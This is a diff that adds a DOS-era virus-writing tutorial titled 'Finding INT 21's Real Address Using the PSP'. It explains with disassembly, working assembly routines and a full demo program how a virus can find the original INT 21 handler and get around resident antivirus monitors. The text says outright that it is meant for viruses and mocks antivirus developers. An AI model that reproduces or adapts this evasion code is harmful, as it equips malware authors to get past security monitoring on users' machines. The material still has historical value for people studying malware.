@@ -1,0 +1,376 @@
+
+
+
+                 FINDING INT 21's REAL ADDRESS USING THE PSP
+                 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+
+                           by Satan's Little Helper
+
+
+    DESCRIPTION
+    ÄÄÄÄÄÄÄÄÄÄÄ
+
+            The real address of interrupt 21 is useful to almost
+        all viruses it enables viruses to bypass resident monitoring
+        software loaded as device drivers or TSR's.  This article will
+        demonstrate a method by which you can obtain the real address
+        of INT 21 by using the entry at offset 6 in the PSP segment.
+
+            PSP:6 contains a double-word pointing (hopefully) to the
+        dos dispatch handler (this is different from the INT 21
+        handler).  Then *optionally* the dispatch handler has a series
+        of jumps (opcode=0EAh) then it will either a) point to the
+        dos dispatch handler or b) the double-NOP call construct used
+        in some DOS versions which will then point to (a).
+
+            The dos dispatch handler and int 21 handler in memory appear
+        like this:
+
+    dos_dispatch_handler:
+        0000  1E                   push    ds
+        0001  2E: 8E 1E 3DE7       mov     ds,word ptr cs:[3DE7h]
+        0006  8F 06 05EC           pop     word ptr ds:[5ECh]
+        000A  58                   pop     ax
+        000B  58                   pop     ax
+        000C  8F 06 0584           pop     word ptr ds:[584h]
+        0010  9C                   pushf
+        0011  FA                   cli
+        0012  50                   push    ax
+        0013  FF 36 0584           push    word ptr ds:[584h]
+        0017  FF 36 05EC           push    word ptr ds:[5ECh]
+        001B  1F                   pop     ds
+        001C  80 F9 24             cmp     cl,24h
+        001F  77 DC                ja      $-22h
+        0021  8A E1                mov     ah,cl
+        0023  EB 06                jmp     $+8
+    int21_handler:
+        0025  FA                   cli
+        0026  80 FC 6C             cmp     ah,6Ch
+        0029  77 D2                ja      $-2Ch
+        002B  80 FC 33             cmp     ah,33h
+
+    therefore:
+
+        int21_handler = dos_dispatch_handler + 25h
+
+            So the end result is we just find 'dos_dispatch_hndlr'
+        address then check that the opcodes are right (1E2E/FA80)
+        and then add (int21_handler-dos_dispatch_hndlr) to the
+        pointer to dos_dispatch_hndlr to get the INT 21 handler
+        address.
+
+        Simple! (read it again if you don't get it).
+
+        In the case of (b) occurring we just do the same except
+        the offset of the dispatch handler from the int 21
+        handler is different:
+
+        0000  90                   nop
+        0001  90                   nop
+        0002  E8 00E0              call    $+0E3h
+        0005  2E: FF 2E 1062       jmp     dword ptr cs:[1062h]
+        000A  90                   nop
+        000B  90                   nop
+        000C  E8 00D6              call    $+0D9h
+        000F  2E: FF 2E 1066       jmp     dword ptr cs:[1066h]
+    int21_handler:
+        0014  90                   nop
+        0015  90                   nop
+        0016  E8 00CC              call    $+0CFh
+        0019  2E: FF 2E 106A       jmp     dword ptr cs:[106Ah]
+        001E  90                   nop
+        001F  90                   nop
+        0020  E8 00C2              call    $+0C5h
+        0023  2E: FF 2E 106E       jmp     dword ptr cs:[106Eh]
+        0028  90                   nop
+        0029  90                   nop
+        002A  E8 00B8              call    $+0BBh
+        002D  2E: FF 2E 1072       jmp     dword ptr cs:[1072h]
+        0032  90                   nop
+        0033  90                   nop
+        0034  E8 00AE              call    $+0B1h
+        0037  2E: FF 2E 1076       jmp     dword ptr cs:[1076h]
+        003C  90                   nop
+        003D  90                   nop
+        003E  E8 00A4              call    $+0A7h
+        0041  2E: FF 2E 107A       jmp     dword ptr cs:[107Ah]
+    dos_dispatch_handler:
+        0046  90                   nop
+        0047  90                   nop
+        0048  E8 009A              call    $+9Dh
+        004B  2E: FF 2E 107E       jmp     dword ptr cs:[107Eh]
+
+    therefore:
+
+        int21_handler = dos_dispatch_handler - 32h
+
+
+    ADVANTAGES & DISADVANTAGES OF THIS METHOD
+    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+            This method requires a very small amount of code and
+        can be made even more efficient than the code shown below.
+
+            Although untrappable it can be confused into tracing
+        into the resident monitor's trapping code.  Much of the
+        logic of this method is hard coded so changes in the
+        opcodes (from TSR AV utilities) will be able to trick it
+        into thinking it has found the correct address (this
+        requires use of the double-NOP signatures).
+
+            AV developers appear to be reluctant to modify their
+        software for specific viruses so may avoid placing the
+        sequence to confuse it into their software.
+
+    CODE
+    ÄÄÄÄ
+
+        This code is not designed to be size efficent it is designed
+        to be easy to understand.
+
+        ;name:      psp_trace
+        ;in cond:   ds=psp segment
+        ;out cond:  ds:bx=int 21 address if carry clear
+        ;           ds:bx=nothing if carry set.
+        ;purpose:   finds int 21 address using a PSP trace.
+
+        psp_trace:
+            lds     bx,ds:[0006h]           ;point to dispatch handler
+        trace_next:
+            cmp     byte ptr ds:[bx],0EAh   ;is it JMP xxxx:xxxx ?
+            jnz     check_dispatch
+            lds     bx,ds:[bx+1]            ;point to xxxx:xxxx of the JMP
+            cmp     word ptr ds:[bx],9090h  ;check for double-NOP signature
+            jnz     trace_next
+            sub     bx,32h                  ;32h byte offset from dispatch
+                                            ;handler
+            cmp     word ptr ds:[bx],9090h  ;int 21 has same sig if it works
+            jnz     check_dispatch
+        good_search:
+            clc
+            ret
+        check_dispatch:
+            cmp     word ptr ds:[bx],2E1Eh  ;check for push ds, cs: override
+            jnz     bad_exit
+            add     bx,25h                  ;25h byte offset from dispatch
+            cmp     word ptr ds:[bx],80FAh  ;check for cli, push ax
+            jz      good_search
+        bad_exit:
+            stc
+            ret
+
+    NOTES
+    ÄÄÄÄÄ
+
+            INT 30h and INT 31h contain *code* (not an address) to
+        jump to the dispatch handler so to trace using INT 30h/31h
+        you just set ds:bx to 0:c0 and call the trace_next in the
+        psp_trace routine.
+
+        Debug hex dump of INT 30/31 addresses in the IVT:
+
+                  Immediate far JMP
+                    ____________
+        -d 0:c0    |            |
+        0000:00C0  EA 28 00 02 01 FF 00 F0-0F 00 02 01 DF 0D 39 01
+                   |_________| |_________|
+                      INT 30     INT 31
+                       addr       addr
+
+        EA 28 00 02 01 = JMP 0102:0028
+
+        ;name:      int30_trace
+        ;out cond:  ds:bx=int 21 address if carry clear
+        ;           ds:bx=nothing if carry set.
+        ;purpose:   finds int 21 address using an INT 30/31 trace.
+
+        int30_trace:
+            xor     bx,bx
+            mov     ds,bx
+            mov     bl,0c0h                 ;point to 0:0c0
+            jmp     short trace_next
+
+
+    OTHER NOTES
+    ÄÄÄÄÄÄÄÄÄÄÄ
+
+        After writing this I heard that the "MG" virus uses the same
+        technique, I have a sample of this virus and it does not use
+        the same technique.
+
+
+    TESTING
+    ÄÄÄÄÄÄÄ
+
+            So far this has been tested on MSDOS 6.x, Novell Netware,
+        and IBM network software all resulting in positive tests.
+
+            Machines running DR DOS, Novell DOS, 4DOS, OS/2 and NT
+        could not be found.  It is expected that this will not work
+        on *ALL* DOS-type platforms but that is why I implemented
+        error codes in the form of the carry flag being set/clear.
+
+
+    CONCLUSION
+    ÄÄÄÄÄÄÄÄÄÄ
+
+            It has been shown that INT 30h/31h is slightly more
+        reliable than the PSP:6 address, so if a call to psp_trace
+        results in carry set then call int30_trace.  The reason
+        you should call PSP trace first is that altering INT 30/31
+        is much easier than altering PSP:6 so it makes the AV do
+        more work ;)
+
+
+    CREDITS
+    ÄÄÄÄÄÄÄ
+
+        TaLoN - helped in working out offsets and told me
+                about int 30h/31h pointing to dispatch handler.
+        Lookout Man - tester
+        Aardvark - network tester
+
+    DEMO PROGRAM
+    ÄÄÄÄÄÄÄÄÄÄÄÄ
+
+
+    ;-------8<--------cut here---------8<-------
+
+    comment |
+
+        TASM ASSEMBLY:
+            tasm psptest.asm
+            tlink /t psptest.obj
+
+        A86 ASSEMBLY:
+            a86 psptest.asm
+    |
+
+    .model tiny
+    .code
+
+    org     100h
+
+start:
+    mov     dx,offset psp_status
+    call    print_str                       ;print "PSP trace: "
+    call    psp_trace                       ;do the trace
+    jc      bad_psp
+print_status:
+    mov     dx,offset ok_str                ;print "Ok!"
+    call    print_str
+    mov     dx,offset psp_addr              ;print "interrupt trace to: "
+    call    print_str
+    push    bx
+    mov     bx,ds                           ;print segment
+    call    bin_to_hex
+    call    print_colon                     ;print ":"
+    pop     bx
+    call    bin_to_hex                      ;print offset
+    jmp     do_int30
+bad_psp:
+    mov     dx,offset bad_str
+    call    print_str
+do_int30:
+    nop
+    nop
+    mov     word ptr cs:do_int30,20CDh      ;exit next time around
+    mov     dx,offset i30_status
+    call    print_str                       ;print "PSP trace: "
+    call    int30_trace
+    jnc     print_status
+    jmp     short do_int30
+
+print_str:
+    mov     ah,9
+    push    ds
+    push    cs
+    pop     ds
+    int     21h
+    pop     ds
+    ret
+
+psp_addr    db  13,10,'Interrupt traced to: $'
+psp_status  db  13,10,'PSP trace      : $'
+i30_status  db  13,10,'INT 30/31 trace: $'
+ok_str      db  'Ok!$'
+bad_str     db  'Failure$'
+
+;name:      psp_trace
+;in cond:   ds=psp segment
+;out cond:  ds:bx=int 21 address if carry clear
+;           ds:bx=nothing if carry set.
+;purpose:   finds int 21 address using a PSP trace.
+
+psp_trace:
+    lds     bx,ds:[0006h]           ;point to dispatch handler
+trace_next:
+    cmp     byte ptr ds:[bx],0EAh   ;is it JMP xxxx:xxxx ?
+    jnz     check_dispatch
+    lds     bx,ds:[bx+1]            ;point to xxxx:xxxx of the JMP
+    cmp     word ptr ds:[bx],9090h  ;check for double-NOP signature
+    jnz     trace_next
+    sub     bx,32h                  ;32h byte offset from dispatch
+                                    ;handler
+    cmp     word ptr ds:[bx],9090h  ;int 21 has same sig if it works
+    jnz     check_dispatch
+good_search:
+    clc
+    ret
+check_dispatch:
+    cmp     word ptr ds:[bx],2E1Eh  ;check for push ds, cs: override
+    jnz     bad_exit
+    add     bx,25h                  ;25h byte offset from dispatch
+    cmp     word ptr ds:[bx],80FAh  ;check for cli, push ax
+    jz      good_search
+bad_exit:
+    stc
+    ret
+
+;name:      int30_trace
+;out cond:  ds:bx=int 21 address if carry clear
+;           ds:bx=nothing if carry set.
+;purpose:   finds int 21 address using an INT 30/31 trace.
+
+int30_trace:
+    xor     bx,bx
+    mov     ds,bx
+    mov     bl,0c0h                 ;point to 0:0c0
+    jmp     short trace_next
+
+bin_to_hex:                         ;will print number in BX as hex
+    push    cx                      ;code stolen from KRTT demo
+    push    dx
+    push    ax
+    mov     ch,4
+rotate:
+    mov     cl,4
+    rol     bx,cl
+    mov     al,bl
+    and     al,0Fh
+    add     al,30h
+    cmp     al,'9'+1
+    jl      print_it
+    add     al,07h
+print_it:
+    mov     dl,al
+    mov     ah,2
+    int     21h
+    dec     ch
+    jnz     rotate
+    pop     ax
+    pop     dx
+    pop     cx
+    ret
+
+print_colon:
+    mov     ah,2
+    mov     dl,':'
+    int     21h
+    ret
+
+    end     start
+
+    ;-------8<--------cut here---------8<-------
+
